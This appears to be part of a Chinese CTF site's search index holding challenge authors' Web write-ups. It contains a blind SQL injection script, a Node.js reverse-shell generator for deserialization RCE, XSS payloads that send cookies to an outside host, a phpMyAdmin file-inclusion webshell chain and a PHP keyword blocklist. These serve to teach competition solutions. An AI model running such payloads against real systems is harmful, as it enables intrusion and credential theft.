\u4e0d\u53ef\u4ee5\u5f53\u524d\u9875\u9762\u76f4\u63a5\u6ce8\u5165\u51fa\u6765 scuctf{}\u6574\u4e2a\u5b57\u6bb5\u4e86\uff0c\u53ea\u80fd\u76f2\u6ce8\u4e00\u4e2a\u4e2a\u8dd1\u4e86 \u6240\u4ee5\u6211\u7684\u6574\u4f53\u601d\u8def\u662f\uff0c\u901a\u8fc7\u5b50\u67e5\u8be2\u6765\u4e0d\u77e5\u5b57\u6bb5\u540d\u7684\u60c5\u51b5\u4e0b\u83b7\u5f97 fffffffl11lgg \u7684\u503c \u8868\u540d\u5f97\u81ea\u5df1\u731c\uff0c\u4f46 CTF \u6bd4\u8d5b\u4e2d\uff0c\u4e00\u822c\u90fd\u662f flag,user,ctf \u4e4b\u7c7b\u7684 \u5b50\u67e5\u8be2\u601d\u8def\uff1a https://nosec.org/home/detail/2245.html \u76f2\u6ce8\u5177\u4f53\u65b9\u6cd5\u5f88\u591a\uff0c\u6211 POC \u91c7\u7528\u7684\u662f get_lock()\u51fd\u6570 \u5177\u4f53\u7528\u6cd5\u5982\u4e0b\uff1a https://xz.aliyun.com/t/2288 \uff08\u5410\u69fd\u4e00\u4e0b\u534f\u4f1a\u670d\u52a1\u5668\u6027\u80fd\u597d\u7684\u4e00\u6279\uff0c\u6b63\u5219\u5ef6\u8fdf\u6ce8\u5165\u79d2\u56de\uff0c\u5ef6\u8fdf\u4e0d\u4e86\u51e0\u79d2) \u4f46\u8fd9\u91cc\u7b2c\u4e8c\u5929\u53d1\u73b0 or \u548c and \u88ab\u653e\u51fa\u6765\u4e86\uff0c\u5f53\u65f6\u5f88\u60ca\u8bb6\uff0c\u672c\u6253\u7b97\u6539\u6765\u7740\uff0c\u4f46\u770b\u5230\u5230\u7b2c\u4e8c\u5929\u4e0b\u5348\u4e3a\u6b62\u4e5f\u6ca1\u51e0\u4e2a\u4eba\u505a\u51fa\u6765\uff0c\u5c31\u4e0d\u6253\u7b97\u6539\u4e86\uff0c\u5c31\u5f53\u964d\u4f4e\u96be\u5ea6\u4e86 \u6240\u4ee5\u8bf4\u8fd9\u9053\u9898\u5982\u679c\u6309\u6211\u539f\u5148\u7684\u51fa\u9898\u601d\u8def\u6765\u770b\u7684\u8bdd\uff0c\u7684\u786e\u6bd4\u8f83\u96be\uff0c\u6bd5\u7adf\u5dee\u4e0d\u591a\u5f53\u534a\u4e2a\u538b\u8f74\u7684\uff0c\u4f46\u51fa\u4e86\u95ee\u9898\u4e4b\u540e\uff0c\u96be\u5ea6\u4f4e\u4e86\u5f88\u591a\uff0c\u7ec6\u5fc3\u7422\u78e8\u505a\u4e00\u4e0b\u7684\u8bdd\uff0c\u8fd8\u662f\u53ef\u4ee5\u505a\u51fa\u6765\u7684~ \u8fd9\u91cc\u8d34\u4e00\u4e0b\u6211\u539f\u5148\u7684 poc \u811a\u672c\uff0c\u4f30\u8ba1\u73b0\u5728\u4e0d\u53ef\u7528\u4e86\uff0c\u65b0\u7684 poc \u53ef\u4ee5\u770b\u770b\u505a\u51fa\u6765\u961f\u4f0d\u7684\u6216\u8005\u7b49\u6211\u6709\u65f6\u95f4\u5199\uff08\u6700\u8fd1\u592a\u5fd9\u4e86~\uff09 import requests import string dic = string . digits + string . ascii_letters + \"!@#$%^&*()_+ {} -=\" url = \"http://47.96.138.65:45787/?id=1\" session = requests . session () def flag (): i = 1 flag = \"\" while True : for j in dic : try : payoad = \"/**/ %26% 26/**/mid((select/**/`2`/**/from/**/(select/**/1,2,3,4/**/\" \\ \"union/**/select/**/*/**/from/**/flag)a/**/limit/**/1,1), {} ,1)=' {} '/**/\" \\ \" %26% 26/**/get_lock('ddog',5)\" . format ( i , j ) url_all = url + payoad t = session . get ( url = url_all , timeout = 3 ) . content print ( t ) if len ( t ) != 0 : print (( \"[*]Flag:\" + flag ) . replace ( \"#&+\" , \"\" )) flag = flag + j except Exception : pass i = i + 1 if __name__ == \"__main__\" : flag () \u51fa\u9898\u4eba\u5bc4\u8bed \u00b6 \u603b\u800c\u8a00\u4e4b\uff0c\u8fd9\u6b21\u6211\u51fa\u7684\u9898\uff0c\u9664\u4e86 Sqli \u6709\u70b9\u5c0f\u96be\u4ee5\u5916\u5176\u4ed6\u4e24\u9053\u9898\u96be\u5ea6\u8fd8\u662f\u53ef\u4ee5\u7684\uff0c\u5fc3\u6001\u653e\u597d\u4ed4\u7ec6\u505a\u7684\u8bdd\uff0c\u63a5\u5927\u591a\u6570\u4eba\u8fd8\u662f\u53ef\u4ee5\u5728\u8fd9\u4e09\u9053\u9898\u62ff\u5230 480 \u5206\uff0c\u5bf9\u4e8e\u6211\u521a\u624d\u63d0\u5230\u7684 BabySqli \u7684\u539f\u6709\u601d\u8def\uff0c\u5927\u5bb6\u53ef\u4ee5\u81ea\u5df1\u642d\u5efa\u73af\u5883\u6d4b\u8bd5\u4e00\u4e0b\u505a\u9898\u601d\u8def\uff0c\u8fd9\u4e24\u5929\u5927\u5bb6\u4e5f\u505a\u9898\u8f9b\u82e6\u4e86\u54c8~","title":"Web"},{"location":"WriteUp/201905/Web/#web","text":"","title":"Web"},{"location":"WriteUp/201905/Web/#_1","text":"","title":"\u4f60\u597d\u5440"},{"location":"WriteUp/201905/Web/#_2","text":"NodeJS \u53cd\u5e8f\u5217\u5316","title":"\u8003\u67e5\u8981\u70b9"},{"location":"WriteUp/201905/Web/#_3","text":"\u6253\u5f00\u9898\u76ee\uff0cF12 \u67e5\u770b\u6e90\u7801\uff0c\u5728\u6ce8\u91ca\u4e2d\u53ef\u4ee5\u53d1\u73b0\u5728 /app.js.bak \u5904\u53ef\u4ee5\u67e5\u770b\u6e90\u7801\u3002 \u67e5\u770b\u6e90\u7801\u4e4b\u540e\uff0c\u53d1\u73b0\u4e00\u5904\u53cd\u5e8f\u5217\u5316\uff0c\u8003\u8651\u4f7f\u7528\u53cd\u5e8f\u5217\u5316\u6765\u8fdb\u884c\u4ee3\u7801\u6267\u884c\u3002 \u7531\u4e8e NodeJS \u7684\u4ee3\u7801\u6267\u884c\u5728\u540e\u7aef\u6267\u884c\uff0c\u6ca1\u6709\u56de\u663e\uff0c\u6b64\u5904\u6709\u51e0\u79cd\u5e38\u89c1\u65b9\u5f0f\u83b7\u5f97\u56de\u663e\uff1aDNS \u89e3\u6790\uff0cHTTP \u8bf7\u6c42\uff0c\u53cd\u5411 Shell\uff08\u7531\u4e8e docker \u53ea\u5f00\u653e\u4e86\u4e00\u4e2a\u7aef\u53e3\uff0c\u65e0\u6cd5\u4f7f\u7528\u6b63\u5411 Shell\uff09\u3002 DNS \u89e3\u6790\uff0cHTTP \u8bf7\u6c42\u7684\u5229\u7528\u65b9\u6cd5\u5927\u5bb6\u53ef\u4ee5\u81ea\u884c\u641c\u7d22\uff0c\u6b64\u5904\u5c55\u793a\u4f7f\u7528\u53cd\u5411 shell \u7684\u65b9\u6cd5\u3002\u9996\u5148\uff0c\u9700\u8981\u751f\u6210\u4e00\u4e2a nodejs \u7684\u53cd\u5411 shell\uff0c\u811a\u672c\u5982\u4e0b\uff1a import sys if len ( sys . argv ) != 3 : print \"Usage: %s <LHOST> <LPORT>\" % ( sys . argv [ 0 ]) sys . exit ( 0 ) IP_ADDR = sys . argv [ 1 ] PORT = sys . argv [ 2 ] def charencode ( string ): \"\"\"String.CharCode\"\"\" encoded = '' for char in string : encoded = encoded + \",\" + str ( ord ( char )) return encoded [ 1 :] print \"[+] LHOST = %s \" % ( IP_ADDR ) print \"[+] LPORT = %s \" % ( PORT ) NODEJS_REV_SHELL = ''' var net = require('net'); var spawn = require('child_process').spawn; HOST=\" %s \"; PORT=\" %s \"; TIMEOUT=\"5000\"; if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; } function c(HOST,PORT) { var client = new net.Socket(); client.connect(PORT, HOST, function() { var sh = spawn('/bin/sh',[]); client.write(\"Connected! \\\\ n\"); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); sh.on('exit',function(code,signal){ client.end(\"Disconnected! \\\\ n\"); }); }); client.on('error', function(e) { setTimeout(c(HOST,PORT), TIMEOUT); }); } c(HOST,PORT); ''' % ( IP_ADDR , PORT ) print \"[+] Encoding\" PAYLOAD = charencode ( NODEJS_REV_SHELL ) print \"eval(String.fromCharCode( %s ))\" % ( PAYLOAD ) \u4f7f\u7528\u8fd9\u4e2a\u811a\u672c\u53ef\u4ee5\u751f\u6210\u4e00\u4e2a\u53cd\u5411 shell\uff0c\u7136\u540e\u53ea\u9700\u8981\u5c06\u8fd9\u4e2a\u53cd\u5411 shell \u653e\u5230 cookie \u91cc\u3002\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61 y={rce : function (){}} ,\u5c06\u4e0a\u9762\u7684\u7a0b\u5e8f\u751f\u6210\u7684\u4ee3\u7801\u7c98\u8d34\u5230\u82b1\u62ec\u53f7\u4e2d\uff0c\u4f7f\u7528 serialize \u65b9\u6cd5\u5bf9\u5176\u8fdb\u884c\u5e8f\u5217\u5316\uff0c\u5f97\u5230\u7684\u4ee3\u7801\u5728\u51fd\u6570\u540e\u52a0\u4e0a\u5706\u62ec\u53f7\uff0c\u4f7f\u5176\u80fd\u81ea\u52a8\u6267\u884c\u3002\u6548\u679c\u5982\u4e0b\uff1a","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"WriteUp/201905/Web/#xss","text":"\u6b64\u6b21\u6bd4\u8d5b\u7684\u4e09\u9053 XSS \u662f\u672c\u7740\u4e0d\u51fa\u8111\u6d1e\u7684\u60f3\u6cd5\u51fa\u7684\uff0c\u9898\u76ee\u672c\u8eab\u6ca1\u6709\u7ed5\u592a\u591a\u5708\u5708\uff0c\u4f46\u662f\u5728\u6bd4\u8d5b\u73af\u5883\u4e0b\u6ca1\u6709\u8003\u8651\u5230\u8d44\u6e90\u5360\u7528\u8fc7\u591a\u548c\u50f5\u5c38\u7a0b\u5e8f\u7684\u60c5\u51b5\uff0c\u5bfc\u81f4\u7f51\u9875\u5de8\u5361\u65e0\u6bd4\u548c\u4e0d\u80fd\u6253\u51fa flag \u7684\u73b0\u8c61\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u51fa\u9898\u65f6\u5404\u51fa\u9898\u4eba\u6ca1\u6709\u534f\u5546 flag \u683c\u5f0f\u7684\u95ee\u9898\uff0c\u6211\u5f55\u5165 docker \u7684\u65f6\u5019 flag \u683c\u5f0f\u5c31\u4e3a fl4g{} \uff0c\u6700\u540e\u4e0a\u9898\u7684\u65f6\u5019\u53c8\u8981\u6c42 scuctf{} \uff0c\u53ef\u80fd\u5751\u4e86\u4e00\u4e9b\u4eba\uff0c\u505a\u9898\u4f53\u9a8c\u5e76\u4e0d\u597d\uff0c\u5728\u8fd9\u91cc\u8868\u793a\u62b1\u6b49 \u4e09\u9053\u9898\u90fd\u662f\u540c\u4e00\u4e2a\u63d0\u4ea4\u5e73\u53f0\uff0c\u4f7f\u7528\u5b50\u8def\u5f84\u4f5c\u4e3a\u9650\u5236(\u63a8\u8350\u9605\u8bfb\uff1a https://www.cnblogs.com/fsjohnhuang/archive/2011/11/22/2258999.html )\uff0c\u4ee5\u8fbe\u5230\u4e09\u9898\u5206\u79bb\u4f46\u662f\u53c8\u4f7f\u7528\u540c\u4e00\u4e2a bot \u7684\u6548\u679c\u3002\u5176\u5b9e\u5728\u8fd9\u91cc\u6211\u8fd8\u662f\u633a\u6015\u51fa\u73b0\u7b80\u5355\u9898\u6253\u5230\u56f0\u96be\u9898\u7684 flag \u7684\u975e\u9884\u671f\u89e3\uff08\u867d\u7136\u5fc3\u7406\u4e0a\u8fd8\u662f\u6bd4\u8f83\u80af\u5b9a\u4e0d\u4f1a\u51fa\u8fd9\u79cd\u60c5\u51b5 XD\uff09 \u6240\u4ee5\uff0c \u4e09\u9053\u9898\u90fd\u662f\u5c06\u5305\u542b\u6253 cookie payload \u7684 url \u4ea4\u7ed9\u63d0\u4ea4\u5e73\u53f0\uff0c\u5e73\u53f0 robot \u4f7f\u7528 firefox \u53bb\u8bbf\u95ee\u4f60\u63d0\u4ea4\u7684 url\uff0c\u4ece\u800c\u83b7\u53d6\u5230\u5728 cookie \u91cc\u7684 flag \u5410\u69fd\uff1axss bot \u771f\u7684\u5751\uff0c\u82b1\u4e86\u5f88\u957f\u65f6\u95f4\u6765\u8c03 bot\uff0c\u7ed3\u679c\u6bd4\u8d5b\u7684\u65f6\u5019\u8fd8\u662f\u51fa\u95ee\u9898\u3002\u3002\u3002\u679c\u7136\u662f\u4ece\u5165\u5751\u5230\u653e\u5f03:) \u63d0\u4ea4\u5e73\u53f0\u622a\u56fe\uff1a","title":"\u4e09\u9053 XSS \u603b\u62ec"},{"location":"WriteUp/201905/Web/#xss_1","text":"","title":"\u7b80\u5355\u7684 XSS"},{"location":"WriteUp/201905/Web/#_4","text":"XSS \u57fa\u672c\u6982\u5ff5 XSS \u83b7\u53d6 cookie","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"WriteUp/201905/Web/#_5","text":"","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"WriteUp/201905/Web/#_6","text":"\u672c\u9898\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4\uff0c\u76f4\u63a5\u8f93\u51fa\u4f20\u5165\u503c\uff0c\u5178\u578b\u7684 XSS \u5165\u95e8\u540e\u53f0\u4ee3\u7801\u3002 \u9996\u5148\uff0c\u770b\u5230\u7f51\u9875\u5c06\u4f20\u5165\u7684\u53c2\u6570\u539f\u6837\u8fd4\u56de\uff1a \u8f93\u5165\u7b80\u5355\u7684\u5f39\u7a97 payload: ?greet=<script>alert(document.domain)</script> \u76f4\u63a5\u5f39\u51fa domain\uff0c\u53ef\u89c1\u6b64\u5904\u6709 XSS \u6f0f\u6d1e\uff1a","title":"\u8bd5\u63a2\u548c\u5f39\u7a97"},{"location":"WriteUp/201905/Web/#flag","text":"\u9996\u5148\uff0c\u5c1d\u8bd5\u5c06\u81ea\u5df1\u7684 cookie \u6253\u5230 xss \u5e73\u53f0\u4e0a\u3002 \u76f4\u63a5\u586b\u5165 payload: ?greet=%3Cimg/src=x%20onerror=%22a=%27http://120.78.185.175/xss/myxss?s=%27%2Bdocument.cookie;new%20Image().src=a%22%3E \uff0c\u8bbf\u95ee\uff1a \u770b\u5230\u6210\u529f\u6253\u51fa cookie\uff1a \u5c06 payload \u8f93\u5165\u63d0\u4ea4\u9875\u9762\u83b7\u53d6 flag\uff1a \u6ce8\u610f\u8981\u5f39\u51fa\u4ee5\u4e0b\u7a97\u53e3\u624d\u8bf4\u660e bot \u6210\u529f\u8bbf\u95ee\u4e86 url\uff1a \u67e5\u770b XSS \u5e73\u53f0\u53ef\u4ee5\u770b\u5230\u6210\u529f\u6253\u5230\u7684 flag\uff1a","title":"\u83b7\u53d6 flag"},{"location":"WriteUp/201905/Web/#xss_2","text":"\u672c\u9898\u7075\u611f\u6765\u6e90\u4e8e\u4e00\u7bc7\u6f0f\u6d1e\u60ac\u8d4f\u7684\u5b9e\u6218 blog\uff0c\u6211\u8bb0\u4e0d\u5230\u5177\u4f53\u51fa\u5904\u4e86\uff0c\u5c31\u63a8\u8350\u4e00\u4e2a \u7f51\u7ad9 \u5427","title":"\u7a0d\u96be\u4e00\u70b9\u7684 XSS"},{"location":"WriteUp/201905/Web/#_7","text":"CSP DOM XSS\uff08Script Gadgets\uff09 \u7ed5\u8fc7 CSP Angularjs","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"WriteUp/201905/Web/#_8","text":"\u672c\u9898\u5728\u7ed9\u51fa hint \u4e4b\u540e\u96be\u5ea6\u964d\u4f4e\u4e86\uff0c\u987a\u7740\u601d\u8def\u8d70\u5c31\u884c\u3002","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"WriteUp/201905/Web/#_9","text":"\u8fd8\u662f\u67e5\u770b\u7f51\u9875\uff0c\u53d1\u73b0\u8fd9\u56de\u6709 CSP \u7b56\u7565\u4e86\uff0c\u5176\u4e2d\u6709\u4e2a\u70b9\u503c\u5f97\u6ce8\u610f\uff1aCSP \u5bf9 sina \u67d0\u57df\u4e0b\u653e\u884c: *.sinaapp.com \uff1a \u8fd9\u4e2a\u57df\u4e0b\u6709\u5565\u597d\u4e1c\u897f\u5462\uff0c\u8fd9\u4e2a\u57df\u4e0b\u6709 lib.sinaapp.com \u662f\u4e2a CDN\uff0c\u53ef\u4ee5\u76f4\u63a5\u5f15\u5165 JS \u5e93\u3002\u4e8e\u662f\u5c31\u60f3\u8d77 17 \u5e74 blackhat \u4e0a\u7684\u6f14\u8bb2\uff1a Script Gadgets \u5728\u8be5\u57df\u4e0b\u627e\u5230\u6709 angularjs \u7684\u5e93\uff0c\u5e76\u4e14\u5b58\u5728\u8001\u7248\u672c\u7684\u5e93: \u8001\u7248\u672c\u7684\u5e93\u6ca1\u6709\u5b89\u5168\u8fc7\u6ee4\uff0c\u53ef\u4ee5\u8fbe\u5230\u7ed5\u8fc7 CSP \u7684\u6548\u679c\uff0cpayload \u4e3a\uff1a <div ng-app> {{constructor.constructor('alert(document.domain)')()}} </div> \u6784\u9020\u5f39\u7a97 payload\uff1a http://120.78.185.175:5000/hachp1/wuziqi/index.php??guest_name=%3Cscript%20src=http://lib.sinaapp.com/js/angular.js/angular-1.0.6/angular.min.js%3E%3C/script%3E%3Cdiv%20ng-app%3E{{constructor.constructor(\"alert(document.domain)\")()}}%3C/div%3E \u6210\u529f\u5f39\u7a97\uff1a","title":"\u8bd5\u63a2\u548c\u5f39\u7a97"},{"location":"WriteUp/201905/Web/#flag_1","text":"\u90fd\u5df2\u7ecf\u5f39\u7a97\u4e86\uff0c\u63a5\u4e0b\u6765\u5c31\u597d\u529e\u4e86\uff0c\u7c7b\u4f3c\u7b2c\u4e00\u9898\uff0c\u76f4\u63a5\u4e0a payload\uff1a http://120.78.185.175:5000/hachp1/wuziqi/index.php?guest_name=%3Cscript%20src=http://lib.sinaapp.com/js/angular.js/angular-1.0.6/angular.min.js%3E%3C/script%3E%3Cdiv%20ng-app%3E{{constructor.constructor(\"document.location='http://120.78.185.175/xss/myxss?c='%2Bdocument.cookie;\")()}}%3C/div%3E \u62ff\u5230 flag\uff1a","title":"\u83b7\u53d6 flag"},{"location":"WriteUp/201905/Web/#xss_3","text":"","title":"\u66f4\u96be\u7684 XSS"},{"location":"WriteUp/201905/Web/#_10","text":"\u539f\u6709\u7684 script \u6807\u7b7e\u53ef\u88ab\u4e4b\u524d\u63d2\u5165\u7684 <script> \u7834\u574f \u6807\u7b7e name \u53ef\u4ee5\u901a\u8fc7 js \u76f4\u63a5\u6210\u4e3a\u53d8\u91cf\u4ece\u800c\u8986\u76d6\u53d8\u91cf \u641c\u539f\u9898\u7684\u80fd\u529b:)","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"WriteUp/201905/Web/#wp","text":"\u672c\u9898\u6765\u6e90\u4e8e TCTF2018 \u7684 bl0g \u9898 \u539f\u9898 WP \u63a8\u8350 https://lorexxar.cn/2018/04/05/0ctf2018-blog/","title":"\u539f\u9898 WP"},{"location":"WriteUp/201905/Web/#_11","text":"","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"WriteUp/201905/Web/#_12","text":"\u8fdb\u5165\u7f51\u9875\uff0c\u8fd8\u662f CSP\uff0c\u4f46\u662f\u66f4\u4e25\u683c\u4e86\uff1a \u66f4\u6539 payload\uff0c\u67e5\u770b\u6e90\u4ee3\u7801\uff0c\u53ef\u4ee5\u770b\u5230\u53c2\u6570\u8f93\u51fa\u7684\u4e24\u4e2a\u4f4d\u7f6e\uff1a \u9875\u9762\u4e2d\u7684 JS \u4ee3\u7801\u8fd0\u884c\u8fc7\u7a0b\u5206\u6790\u4e00\u4e0b\uff0c\u6700\u540e\u4e00\u6bb5\u6e90\u7801\u5c06\u7b2c\u4e00\u6bb5\u6e90\u7801\u4e2d\u51fa\u73b0\u7684\u8fde\u63a5 append \u5230\u7f51\u9875\u540e\uff1a \u89c2\u5bdf\u53ef\u4ee5\u53d1\u73b0\uff0c\u53ef\u63a7\u70b9\u4e00\u4e2a\u5728\u7b2c\u4e00\u6bb5\u4ee3\u7801\u524d\uff0c\u4e00\u4e2a\u5219\u76f4\u63a5\u51b3\u5b9a\u4e86 name_links \u7684\u7d22\u5f15\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7b2c\u4e00\u4e2a\u53ef\u63a7\u70b9\u7834\u574f\u7b2c\u4e00\u6bb5\u4ee3\u7801\uff0c\u7b2c\u4e8c\u6bb5\u4ee3\u7801\u6784\u9020 name \u4e3a name_links \u7684 form \u6807\u7b7e\uff0c\u5e76\u76f4\u63a5\u901a\u8fc7 name_links \u83b7\u53d6\u6211\u4eec\u6784\u9020\u7684\u6807\u7b7e\u7684 id \u503c\uff0c\u5e76\u628a\u503c\u8f93\u51fa\u5728\u9875\u9762\u4e0a\uff1b\u6b64\u65f6\uff0c\u5c31\u53ef\u4ee5\u5c06\u6076\u610f payload \u6ce8\u5165\u7f51\u9875\u3002\uff08\u53ef\u80fd\u903b\u8f91\u6709\u70b9\u6655\uff0c\u5efa\u8bae\u5bf9\u7167 TCTF \u539f\u9898 WP \u4e00\u8d77\u7406\u89e3\uff09 \u6700\u540e\uff0c\u5f39\u7a97 payload \u5982\u4e0b\uff08\u9700\u8981\u6ce8\u610f\u7684\u4e24\u70b9\u662f\uff0c1. \u53ea\u6709\u6807\u7b7e\u539f\u6709\u7684\u5c5e\u6027\u540d\u624d\u80fd\u6210\u529f\u83b7\u53d6\u5230\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f7f\u7528\u7684\u662f id \u6765\u83b7\u53d6\uff1b2. \u5728\u8fd9\u91cc\u6211\u8fc7\u6ee4\u4e86\u9664 form \u5916\u7684\u5176\u4ed6\u6807\u7b7e\uff0c\u6240\u4ee5\u9700\u8981\u5148\u95ed\u5408\u524d\u9762\u7684 form \u6807\u7b7e\uff0c\u539f\u9898\u7684 WP \u4e0d\u80fd\u76f4\u63a5\u7528\uff09\uff1a http://120.78.185.175:5000/hachp1/pintu/index.php?name=%22%3E%3Cscript%3E&ft_id=id%22%3E%3C/form%3E%3CForm+name%3Dname_links+id%3D%22%3Cscript%3Ealert(document.domain);%3C%2Fscript%3E%22%3E \u5f39\u7a97\u5982\u4e0b\uff1a","title":"\u8bd5\u63a2\u548c\u5f39\u7a97"},{"location":"WriteUp/201905/Web/#flag_2","text":"\u540c\u7b2c\u4e8c\u9898\uff0c\u90fd\u5f39\u7a97\u4e86\uff0c\u5269\u4e0b\u7684\u4e0d\u7528\u8bf4\u4e86\uff0c\u6253 flag\uff1a http://120.78.185.175:5000/hachp1/pintu/index.php?name=\"><script>&ft_id=id\"></form><Form+name%3Dname_links+id%3D\"<script>document.location='http://120.78.185.175/xss/myxss?c='%2Bdocument.cookie;<%2Fscript>\"> flag:","title":"\u83b7\u53d6 flag"},{"location":"WriteUp/201905/Web/#_13","text":"\u6700\u540e\uff0c\u795d\u8d3a\u5728\u6bd4\u8d5b\u4e2d\u6253\u51fa\u4e09\u9053\u9898\u7684\u5927\u4f6c XD\uff0c\u4e5f\u5e0c\u671b\u6ca1\u6709\u6253\u51fa\u6765\u7684\u540c\u5b66\u4eec\u80fd\u5b66\u5230\u4e00\u4e9b\u4e1c\u897f\uff0c\u8fd9\u6837\u8fd9\u4e09\u9898\u7684\u4f7f\u547d\u5c31\u5b8c\u6210\u4e86\u3002","title":"\u51fa\u9898\u4eba\u5bc4\u8bed"},{"location":"WriteUp/201905/Web/#_14","text":"\u8fd9\u9053\u9898\u522b\u770b 400 \u591a\u5206\u5728 Web \u9898\u91cc\u5206\u662f\u6700\u9ad8\u7684\uff0c\u5176\u5b9e\u8fd9\u4e5f\u7b97\u4e00\u9053\u9001\u5206\u9898\uff0c\u5b9e\u9645\u96be\u5ea6\u5927\u6982 150 \u5206\u5de6\u53f3 \u5230\u6700\u540e\u53ea\u6709\u56db\u4e94\u4e2a\u961f\u4f0d\u505a\u51fa\u6765\uff0c\u8fd8\u662f\u6709\u4e9b\u611f\u6168 \u9898\u76ee\u63d0\u793a\u4e86\u7528\u6237\u540d\u662f scuctf\uff0c\u5bc6\u7801\u6ca1\u7ed9\uff0c\u8fd9\u79cd\u60c5\u51b5\u90fd\u662f\u5f31\u53e3\u4ee4\uff0c\u76f4\u63a5 BurpSuite \u7206\u7834\u4e00\u4e0b 123456 \u5c31\u51fa\u6765\u4e86 \u8fdb\u53bb\u770b\u5230 PhpMyAdmin\uff0c\u6ca1\u6709\u5168\u5c40\u6743\u9650\uff0c\u90a3\u5c31\u4e0d\u53ef\u4ee5\u5199\u6587\u4ef6\u4e4b\u7c7b\u7684\uff0c\u53f3\u8fb9\u770b\u5230 PhpMyAdmin \u7248\u672c\u4e3a 4.8.1 \u7136\u540e\u641c\u4e00\u4e0b\u8fd9\u4e2a\u7248\u672c\u7684\u6f0f\u6d1e\uff0c\u53d1\u73b0\u4e00\u4e2a\u540e\u53f0 getshell \u7684\u6f0f\u6d1e https://www.cnblogs.com/fox-yu/p/9209203.html \u76f4\u63a5\u4e0a\u6700\u7b80\u5355\u7684\u505a\u6cd5\uff0c\u8fd8\u6709\u4e00\u4e2a\u5199\u5165\u8868\u5185\u5305\u542b\u8868\u6587\u4ef6\u7684\u505a\u6cd5\u81ea\u5df1\u627e\u627e\u54c8\uff0c\u539f\u7406\u4e00\u6837~ select '<?php @eval($_GET[1]);?>' ; \u7136\u540e\u5305\u542b\u4e00\u4e0b sess_cookie \u6587\u4ef6 index.php?target=db_sql.php%3f/../../../../../../../../var/lib/php/sessions/sess_(\u4f60\u7684cookie) cookie \u662f phpMyAdmin \u7684\u503c \u7136\u540e index.php?target=db_sql.php%3f/../../../../../../../../var/lib/php/sessions/sess_(\u4f60\u7684cookie)&1=system('ls /'); index.php?target=db_sql.php%3f/../../../../../../../../var/lib/php/sessions/sess_(\u4f60\u7684cookie)&1=system('cat /fl444444g'); \u8fd9\u9053\u9898\u5230\u6b64\u4e3a\u6b62~","title":"\u827e\u8fea\u9b54\u529b\u8f6c\u5708\u5708"},{"location":"WriteUp/201905/Web/#_15","text":"\u8fd9\u9053\u9898\u4e00\u5f00\u59cb\u662f\u6ca1\u4eba\u505a\u51fa\u6765\u7684\uff0c\u4f46\u53ea\u6709 80 \u5206\u7684\u9898\u561b\uff0c\u80fd\u96be\u5012\u90a3\u91cc\u53bb\u5462\uff1f \u8fd9\u91cc\u4f7f\u7528\u7b2c\u4e8c\u4e2a\u5730\u5740\uff08\u4fe9\u5730\u5740\u4e00\u6837\uff09 \u7ed9\u7684\u5730\u5740\u53ea\u662f http://47.96.138.65:45787/didi \u8fdb\u53bb\u4e4b\u540e\u5c31\u4e00\u4e2a\u8170\u5b50\u59d0\u548c PDD\uff0c\u4f46\u662f\u4f60\u4eec\u4ed4\u7ec6\u89c2\u5bdf UR \u91cc\u7684\u53d8\u5316\u4e86\u561b\uff1f \u4f60\u8f93\u5165\u7684\u662f http://47.96.138.65:45787/didi \u8fdb\u53bb\u53d8\u6210\u4e86 http://47.96.138.65:45787/didi/secret.php apache \u9ed8\u8ba4\u7684\u5165\u53e3\u6587\u4ef6\u662f index.php \u4ed6\u5374\u662f\u51fa\u73b0\u7684 secret.php\uff0c\u8fd9\u4e0d\u662f\u6709\u95ee\u9898\u561b F12 \u4e00\u4e0b\u770b\u5230 index.php \u88ab 302 \u8df3\u8f6c\u4e86\uff0c\u5e76\u4e14 flag \u5c31\u5728\u4e0b\u9762\u7684 Set-Cookie \u4e2d\uff0c\u8fd9\u91cc\u6211\u8bbe\u7f6e\u4e86 cookie \u751f\u6548\u65f6\u95f4\u4e3a 0.01 \u79d2\uff0c\u4e14\u53ea\u5bb9\u8bb8\u5bf9 index.php \u751f\u6548\uff0c\u6240\u4ee5\u5728\u5176\u4ed6\u7f51\u9875\u91cc\u662f\u770b\u4e0d\u5230\u7684 \u76f4\u63a5\u628a flag \u7684\u503c base64 \u89e3\u7801\u4e00\u4e0b\u5c31\u51fa\u6765 flag \u4e86 \u505a\u9898\u8fc7\u7a0b\u4e2d\u770b\u5230\u6709\u7684\u540c\u5b66\u76f4\u63a5 scuctf{U0NVQ1RGe3kwVV9qVXM3X25lRWRfY2FyM2Z1bH0%3D} \u63d0\u4ea4\u4e86\u4e0a\u6765\uff0c\u5176\u5b9e\u5c31\u5dee\u6700\u540e\u4e00\u6b65\u4e86\uff0c\u6709\u70b9\u53ef\u60dc~ \u6240\u4ee5\u8fd9\u9053\u9898\u5176\u5b9e\u5f88\u7b80\u5355\uff0c\u5c31\u8003\u4e2a\u7b80\u5355\u7684\u6293\u5305\u548c\u770b\u4f60\u7ec6\u5fc3\u7a0b\u5ea6\uff0cOK \u4e0b\u4e00\u9053~","title":"\u6765\u4e86\u8001\u5f1f"},{"location":"WriteUp/201905/Web/#babysqli","text":"\u8fd9\u91cc\u653e\u4e0a\u6e90\u4ee3\u7801 config.php <?php error_reporting ( 0 ); $servername = \"localhost\" ; $username = \"root\" ; $password = \"**********************\" ; $dbname = \"scuctf\" ; function stop_hack ( $value ){ $pattern = \"insert|delete|bool|extractvalue|rand|group|geometrycollection|multipoint|multipolygon|regexp|linestring|multilinestring|name_const|right|char|benchmark|polygon|char|rlike|concat|rpad|repeat|sleep|ascii|innodb|and|if|exp|updatexml|left|pow|concat_ws|group_concat|substr|join|floor|\\.\\.\\/|\\.\\/|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system| |eval\" ; $back_list = explode ( \"|\" , $pattern ); foreach ( $back_list as $hack ){ if ( preg_match ( \"/ $hack /i\" , $value )) die 